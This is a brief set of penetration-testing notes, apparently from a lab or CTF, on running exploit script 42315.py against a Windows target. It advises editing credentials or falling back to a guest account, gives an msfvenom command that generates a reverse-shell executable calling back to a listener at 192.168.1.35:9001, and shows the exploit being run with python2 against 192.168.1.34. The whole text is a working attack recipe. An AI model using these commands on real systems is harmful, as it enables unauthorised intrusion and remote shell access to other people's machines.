- Modify user/password in the exploit - try with guest account if no credentials are available
- Generate a reverse shell payload, e.g.

```
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rshell.exe LHOST=192.168.1.35 LPORT=9001
```

- Run with python2 on the target ip:

```
python 42315.py 192.168.1.34
```
